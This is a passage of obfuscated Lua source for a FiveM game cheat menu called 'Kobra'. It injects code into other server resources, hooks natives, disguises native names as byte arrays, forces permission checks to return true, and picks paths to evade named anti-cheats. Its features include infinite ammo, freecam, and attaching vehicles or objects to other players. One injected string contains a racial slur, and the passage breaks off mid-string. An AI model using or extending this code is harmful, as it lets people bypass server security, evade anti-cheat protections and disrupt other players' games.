v1105(...);end);hNative("SetTextProportional",function(v1106,...) return v1106(...);end);hNative("SetTextScale",function(v1107,...) return v1107(...);end);hNative("SetTextDropShadow",function(v1108,...) return v1108(...);end);hNative("SetTextEdge",function(v1109,...) return v1109(...);end);hNative("SetTextOutline",function(v1110,...) return v1110(...);end);hNative("SetTextCentre",function(v1111,...) return v1111(...);end);hNative("SetTextColour",function(v1112,...) return v1112(...);end);hNative("BeginTextCommandDisplayText",function(v1113,...) return v1113(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1114,...) return v1114(...);end);hNative("EndTextCommandDisplayText",function(v1115,...) return v1115(...);end);hNative("GetCamCoord",function(v1116,...) return v1116(...);end);hNative("GetCamRot",function(v1117,...) return v1117(...);end);hNative("IsControlPressed",function(v1118,...) return v1118(...);end);hNative("GetDisabledControlNormal",function(v1119,...) return v1119(...);end);hNative("TaskStandStill",function(v1120,...) return v1120(...);end);hNative("SetFocusPosAndVel",function(v1121,...) return v1121(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1122,...) return v1122(...);end);hNative("GetShapeTestResult",function(v1123,...) return v1123(...);end);hNative("IsControlJustPressed",function(v1124,...) return v1124(...);end);hNative("IsDisabledControlJustPressed",function(v1125,...) return v1125(...);end);hNative("IsEntityAVehicle",function(v1126,...) return v1126(...);end);hNative("TaskWarpPedIntoVehicle",function(v1127,...) return v1127(...);end);hNative("SetEntityCoords",function(v1128,...) return v1128(...);end);hNative("GiveWeaponToPed",function(v1129,...) return v1129(...);end);hNative("SetCurrentPedWeapon",function(v1130,...) return v1130(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1131,...) return v1131(...);end);RenderScriptCams(false,false,1032 -(809 + 223) ,true,true);if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;end SetFocusEntity(PlayerPedId());else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                    _G.KobraFreecamEnabled = false
                    _G.KobraFreecamThreadRunning = false

                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    RenderScriptCams(false, false, 0, true, true)
                    if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject, false) _G.KobraFreecamObject = nil end
                    SetFocusEntity(PlayerPedId())
                ]]);end else local v898=0 -0 ;while true do if (v898==3) then hNative("SetTextProportional",function(v1158,...) return v1158(...);end);hNative("SetTextScale",function(v1159,...) return v1159(...);end);hNative("SetTextDropShadow",function(v1160,...) return v1160(...);end);hNative("SetTextEdge",function(v1161,...) return v1161(...);end);hNative("SetTextOutline",function(v1162,...) return v1162(...);end);v898=4;end if (v898==5) then hNative("GetCamCoord",function(v1163,...) return v1163(...);end);hNative("GetCamRot",function(v1164,...) return v1164(...);end);hNative("IsControlPressed",function(v1165,...) return v1165(...);end);hNative("GetDisabledControlNormal",function(v1166,...) return v1166(...);end);hNative("TaskStandStill",function(v1167,...) return v1167(...);end);v898=17 -11 ;end if ((13 -9)==v898) then hNative("SetTextCentre",function(v1168,...) return v1168(...);end);hNative("SetTextColour",function(v1169,...) return v1169(...);end);hNative("BeginTextCommandDisplayText",function(v1170,...) return v1170(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1171,...) return v1171(...);end);hNative("EndTextCommandDisplayText",function(v1172,...) return v1172(...);end);v898=5;end if (v898==(6 + 2)) then hNative("ShootSingleBulletBetweenCoords",function(v1173,...) return v1173(...);end);RenderScriptCams(false,false,0 + 0 ,true,true);if _G.KobraFreecamObject then local v1296=0;while true do if (v1296==(617 -(14 + 603))) then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;break;end end end SetFocusEntity(PlayerPedId());break;end if ((136 -(118 + 11))==v898) then hNative("IsEntityAVehicle",function(v1174,...) return v1174(...);end);hNative("TaskWarpPedIntoVehicle",function(v1175,...) return v1175(...);end);hNative("SetEntityCoords",function(v1176,...) return v1176(...);end);hNative("GiveWeaponToPed",function(v1177,...) return v1177(...);end);hNative("SetCurrentPedWeapon",function(v1178,...) return v1178(...);end);v898=8;end if (v898==2) then hNative("SetCamRot",function(v1179,...) return v1179(...);end);hNative("RenderScriptCams",function(v1180,...) return v1180(...);end);hNative("DestroyCam",function(v1181,...) return v1181(...);end);hNative("SetFocusEntity",function(v1182,...) return v1182(...);end);hNative("SetTextFont",function(v1183,...) return v1183(...);end);v898=3;end if (v898==1) then hNative("IsVehicleSeatFree",function(v1184,...) return v1184(...);end);hNative("PlayerPedId",function(v1185,...) return v1185(...);end);hNative("GetEntityCoords",function(v1186,...) return v1186(...);end);hNative("CreateCam",function(v1187,...) return v1187(...);end);hNative("SetCamCoord",function(v1188,...) return v1188(...);end);v898=1 + 1 ;end if (6==v898) then hNative("SetFocusPosAndVel",function(v1189,...) return v1189(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1190,...) return v1190(...);end);hNative("GetShapeTestResult",function(v1191,...) return v1191(...);end);hNative("IsControlJustPressed",function(v1192,...) return v1192(...);end);hNative("IsDisabledControlJustPressed",function(v1193,...) return v1193(...);end);v898=6 + 1 ;end if (v898==(0 -0)) then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v1194,v1195) local v1196=_G[v1194];if ( not v1196 or (type(v1196)~="function")) then return;end _G[v1194]=function(...) return v1195(v1196,...);end;end hNative("CreateThread",function(v1197,...) return v1197(...);end);hNative("Wait",function(v1198,...) return v1198(...);end);v898=950 -(551 + 398) ;end end end break;end if (v515==(0 + 0)) then v32=false;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=false}));v515=1 + 0 ;end end end end;v12.EnableInfiniteAmmo=function(v199) if (GetResourceState("WaveShield")=="started") then local v516=0 + 0 ;local v517;local v518;local v519;local v520;local v521;local v522;local v523;local v524;local v525;local v526;local v527;while true do if (v516==(3 -2)) then v518=nil;function v518(v855) return _G[v517(v855)];end if  not _G.osintInfAmmo then _G.osintInfAmmo={enabled=false};end v516=2;end if (v516==(9 -5)) then v524=v518({68,31 + 80 ,101,115,69,600 -(99 + 391) ,96 + 20 ,461 -356 ,287 -171 ,318 -197 ,69,537 -(203 + 214) ,83 + 22 ,115,116});v525=v518({87,273 -176 ,515 -(269 + 141) ,116});v526={};v516=5;end if (v516==(1983 -(362 + 1619))) then _G.osintInfAmmo.enabled=true;v519=v518({31 + 49 ,1395 -(485 + 802) ,1170 -(1065 + 8) ,121,101,114,80,251 -150 ,42 + 58 ,35 + 38 ,379 -279 });v520=v518({133 -62 ,73 + 28 ,570 -454 ,83,101,954 -(518 + 328) ,161 -60 ,290 -191 ,302 -186 ,92 + 9 ,100,49 + 31 ,101,33 + 67 ,87,360 -259 ,133 -36 ,278 -166 ,27 + 84 ,110});v516=3;end if ((2 + 3)==v516) then v527=nil;function v527(v856) local v857=0;local v858;local v859;while true do if (v857==(0 -0)) then v858=coroutine.create(v856);v859=nil;v857=1;end if ((1 + 0)==v857) then function v859() while coroutine.status(v858)~="dead"  do local v1199,v1200=coroutine.resume(v858);if  not v1199 then print("^1[Kobra InfAmmo] Coroutine error: ^7",v1200);break;end v525(0);end end v859();break;end end end if  not _G.osintWaveLoop then local v899=0;while true do if (v899==0) then _G.osintWaveLoop=true;v527(function() while _G.osintWaveLoop do local v1297=0;while true do if (v1297==(613 -(520 + 93))) then if _G.osintInfAmmo.enabled then local v1457=276 -(259 + 17) ;local v1458;while true do if (0==v1457) then v1458=v519();if v524(v1458) then local v1705=v520(v1458);if (v1705 and (v1705~=v521("WEAPON_UNARMED"))) then local v1723,v1724=v522(v1458,v1705);local v1725=tostring(v1458);if  not v526[v1725] then v526[v1725]=v1724;end if (v1724<v526[v1725]) then v523(v1458,v1705,v526[v1725] -v1724 );end end end break;end end else coroutine.yield();end coroutine.yield();break;end end end end);break;end end end break;end if (v516==(0 + 0)) then print("1");v517=nil;function v517(v860) local v861=0 + 0 ;local v862;while true do if (v861==(0 -0)) then v862="";for v1132=1, #v860 do v862=v862   .. string.char(v860[v1132]) ;end v861=1;end if (v861==(592 -(396 + 195))) then return v862;end end end v516=1;end if (v516==3) then v521=v518({71,101,536 -420 ,617 -(424 + 121) ,1444 -(641 + 706) ,115,544 -(249 + 191) ,75,46 + 55 ,548 -(183 + 244) });v522=v518({801 -(434 + 296) ,613 -(169 + 343) ,116,114 -49 ,90 + 19 ,1232 -(651 + 472) ,48 + 63 ,73,110,9 + 71 ,101,88 + 12 ,87,101,97,67 + 45 ,111,110});v523=v518({93 -28 ,73 + 27 ,173 -73 ,192 -127 ,964 -(112 + 743) ,1280 -(1026 + 145) ,20 + 91 ,802 -(493 + 225) ,111,80,62 + 39 ,2 + 98 });v516=4;end end elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);end end;v12.DisableInfiniteAmmo=function(v200) if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            if _G.osintInfAmmo then
                _G.osintInfAmmo.enabled = false
            end
        ]]);elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);end end;v12.AttachSelectedVehicle=function(v201,v202,v203) if ( not v202 or ( #v202==(0 -0))) then local v528=0 + 0 ;while true do if (v528==(0 -0)) then v201:Notify("error","Kobra","No players selected!",3000);return;end end end if ( not v203 or ( #v203==(1595 -(210 + 1385)))) then v201:Notify("error","Kobra","Invalid vehicle model!",4689 -(1201 + 488) );return;end local function v204(v328) local v329=0 + 0 ;local v330;while true do if (v329==(0 -0)) then v330={};for v730=1 -0 , #v328 do v330[v730]=string.byte(v328,v730);end v329=586 -(352 + 233) ;end if (v329==1) then return table.concat(v330,",");end end end local v205=v203;local v206=v204(v205);local v207=GetCurrentServerEndpoint();local v208=0 -0 ;for v331,v332 in ipairs(v202) do if (GetResourceState("solos-rentals")=="started") then print("[vehicle_attach] Fallback: solos-rentals");local v554,v555=pcall(function() MachoInjectResource("solos-rentals",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    config.locations["customnigga"] = {
                        vehiclespawncoords = vec4(coords.x, coords.y, coords.z, heading)
                    }
                    TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga", function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v206,v332));end);if v554 then v208=v208 + 1 + 0 ;end elseif (GetResourceState("amigo")=="started") then local v732=0;local v733;local v734;while true do if (v732==0) then print("[vehicle_attach] Fallback: Amigo RP");v733,v734=pcall(function() MachoInjectResourceRaw("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v206,v332));end);v732=1;end if ((2 -1)==v732) then if v733 then v208=v208 + (575 -(489 + 85)) ;end break;end end elseif (GetResourceState("qb-core")=="started") then local v900=0;local v901;local v902;while true do if (v900==1) then if v901 then v208=v208 + 1 ;end break;end if (v900==(1501 -(277 + 1224))) then print("[vehicle_attach] Fallback #02");v901,v902=pcall(function() MachoInjectResource("qb-core",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    QBCore.Functions.SpawnVehicle(model, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end, coords, true, true)
                ]],v206,v332));end);v900=1;end end elseif ((v207:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then local v1005=0;local v1006;local v1007;while true do if (v1005==(1493 -(663 + 830))) then print("[vehicle_attach] Fallback #1");v1006,v1007=pcall(function() MachoInjectResource("drc_gardener",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    SpawnVehicleAndWarpPlayer(model, coords)
                ]],v206,v332));end);v1005=1 + 0 ;end if (v1005==(2 -1)) then if v1006 then v208=v208 + 1 ;end break;end end elseif (GetResourceState("lunar_bridge")=="started") then local v1201=0;local v1202;local v1203;while true do if (v1201==(876 -(461 + 414))) then if v1202 then v208=v208 + 1 + 0 ;end break;end if (v1201==(0 + 0)) then print("[vehicle_attach] Fallback #2");v1202,v1203=pcall(function() MachoInjectResourceRaw("lunar_bridge",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    Framework.spawnVehicle(model, coords, heading, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            SetVehicleOnGroundProperly(vehicle)
                            Citizen.Wait(500)
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v206,v332));end);v1201=1;end end elseif (GetResourceState("lation_laundering")=="started") then print("[vehicle_attach] Fallback #3");local v1329,v1330=pcall(function() MachoInjectResourceRaw("lation_laundering",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local position = vector4(coords.x, coords.y, coords.z + 0.5, heading)
                    local vehicle = SpawnVehicle(model, position)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetVehicleOnGroundProperly(vehicle)
                        Citizen.Wait(500)
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        ShowNotification("~g~Vehicle attached successfully!")
                    end
                ]],v206,v332));end);if v1329 then v208=v208 + 1 + 0 ;end else local v1331=0 + 0 ;local v1332;local v1333;while true do if (v1331==0) then print("[vehicle_attach] Universal Fallback");v1332,v1333=pcall(function() local v1459=250 -(172 + 78) ;local v1460;while true do if (v1459==(0 -0)) then v1460=string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    RequestModel(model)
                    local maxAttempts = 20
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < maxAttempts do
                        Citizen.Wait(500)
                        attempts = attempts + 1
                    end
                    if attempts >= maxAttempts then return end
                    
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local vehicle = CreateVehicle(model, coords.x, coords.y, coords.z, heading, true, true)
                    if vehicle and DoesEntityExist(vehicle) then
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        SetModelAsNoLongerNeeded(model)
                    end
                ]],v206,v332);MachoInjectResourceRaw("any",v1460,v332);break;end end end);v1331=1 + 0 ;end if (v1331==(1 -0)) then if v1332 then v208=v208 + 1 + 0 ;end break;end end end end end;function encodeToByteArrayLiteral(v209) local v210=0;local v211;while true do if (v210==(1 + 0)) then if ( #v209==0) then return "";end v211={};v210=3 -1 ;end if (v210==(2 -0)) then for v644=1, #v209 do v211[ #v211 + 1 + 0 ]=tostring(string.byte(v209,v644));end return table.concat(v211,", ");end if (v210==0) then if  not v209 then return "";end if (type(v209)~="string") then return tostring(v209);end v210=1;end end end v12.SpawnSelectedObject=function(v212,v213) if ( not v213 or ( #v213==(0 + 0))) then local v529=0 + 0 ;while true do if (v529==(0 -0)) then v212:Notify("error","Kobra","No players selected!",3000);return;end end end local v214=v212:GetSelectedObjectModel();if ( not v214 or ( #v214==0)) then local v530=0;while true do if (v530==(0 -0)) then v212:Notify("error","Kobra","Invalid object model!",920 + 2080 );return;end end end local v215=encodeToByteArrayLiteral(v214);local v216=0 + 0 ;for v333,v334 in ipairs(v213) do if ((GetResourceState("qb-core")=="started") or ((GetResourceState("mc9-core")=="started") and ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started") or (GetResourceState("ReaperV4")=="started") or (GetResourceState("WaveShield")=="started")))) then local v556=0;while true do if (v556==0) then v212:Notify("error","Kobra","Using Qb-core Spawner!",3000);MachoInjectResource("qb-core",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and joaat(model) or model
                QBCore.Functions.LoadModel(hash)
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]],v215,v334));v556=448 -(133 + 314) ;end if (v556==1) then v216=v216 + 1 ;break;end end elseif (GetResourceState("cd_dispatch")=="started") then local v735=0 + 0 ;while true do if (v735==0) then print("using fallback");MachoInjectResource("cd_dispatch",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                
                -- Hook CreateObject to override hash and ensure model loading
                local originalCreateObject = CreateObject
                CreateObject = function(objHash, x, y, z, dynamic, placeOnGround, p7)
                    if type(objHash) == 'number' and objHash ~= hash then
                        -- Override with our custom hash for this spawn
                        objHash = hash
                    end
                    RequestModel(objHash)
                    while not HasModelLoaded(objHash) do
                        Citizen.Wait(0)
                    end
                    local obj = originalCreateObject(objHash, x, y, z, dynamic, placeOnGround, p7)
                    SetModelAsNoLongerNeeded(objHash)
                    return obj
                end
                
                -- Spawn the object on target player
                local player = GetPlayerFromServerId(%d)
                if player == -1 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                end
                
                -- Restore original CreateObject
                CreateObject = originalCreateObject
            ]],v215,v334));v735=214 -(199 + 14) ;end if (v735==1) then v216=v216 + (3 -2) ;break;end end elseif (GetResourceState("rcore_drunk")=="started") then local v903=1549 -(647 + 902) ;while true do if (v903==(0 -0)) then MachoInjectResourceRaw("rcore_drunk",string.format([[
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local hash = GetHashKey(model)
                RequestModel(hash)
                while not HasModelLoaded(hash) do Citizen.Wait(0) end
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
            ]],v214,v334));v216=v216 + (234 -(85 + 148)) ;break;end end elseif (GetResourceState("lc_fuel")=="started") then MachoInjectResourceRaw("lc_fuel",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    Config.NozzleProps.gas = model
                    local entity = createFuelNozzleObject()
                    SetEntityCoords(entity, coords)
                end
                spawnObj()
            ]],v214,v334));v216=v216 + 1 ;elseif (GetResourceState("0r-illegalpack")=="started") then MachoInjectResourceRaw("0r-illegalpack",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local entity = Utils.createObject(model, coords, vec3(0.0, 0.0, 0.0), true, true, false)
                end
                spawnObj()
            ]],v214,v334));v216=v216 + (1290 -(426 + 863)) ;elseif (GetResourceState("xradio")=="started") then local v1334=0 -0 ;while true do if (v1334==(1654 -(873 + 781))) then MachoInjectResourceRaw("xradio",string.format([[
